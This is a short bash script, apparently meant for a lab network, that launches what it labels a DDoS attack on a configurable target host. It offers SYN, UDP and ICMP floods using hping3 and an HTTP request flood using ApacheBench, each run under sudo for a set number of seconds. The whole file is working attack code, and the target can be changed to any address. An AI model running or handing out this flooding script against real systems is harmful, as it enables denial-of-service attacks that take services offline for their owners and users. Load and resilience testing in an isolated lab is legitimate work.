#!/usr/bin/env bash
set -euo pipefail

TARGET="${TARGET:-192.168.56.20}"
TYPE="${TYPE:-syn}"
DURATION="${DURATION:-15}"

echo "[*] DDoS attack: $TYPE → $TARGET (${DURATION}s)"

case "$TYPE" in
    syn)
        sudo timeout "$DURATION" hping3 -S --flood -V -p 443 "$TARGET" || true
        ;;
    udp)
        sudo timeout "$DURATION" hping3 --udp --flood -p 80 "$TARGET" || true
        ;;
    icmp)
        sudo timeout "$DURATION" hping3 --icmp --flood "$TARGET" || true
        ;;
    http)
        sudo timeout "$DURATION" ab -n 100000 -c 500 "https://$TARGET/" 2>/dev/null || true
        ;;
    *)
        echo "Usage: TYPE=syn|udp|icmp|http $0"
        exit 1
        ;;
esac

echo "[+] Attack '$TYPE' finished"
